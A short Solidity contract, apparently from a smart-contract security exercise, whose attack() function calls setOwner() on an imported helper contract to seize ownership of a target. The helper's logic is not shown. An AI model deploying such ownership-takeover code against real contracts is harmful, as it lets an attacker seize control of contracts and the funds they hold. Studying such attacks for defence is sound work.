// SPDX-License-Identifier: MIT
pragma solidity ^0.8.17;

import "./AttackHelper.sol";

contract AttackTodos {
    address public attackHelper;

    constructor(address _attackHelper) {
        attackHelper = _attackHelper;
    }

    function attack() public {
        attackHelper.call(abi.encodeWithSignature("setOwner()"));
    }
}
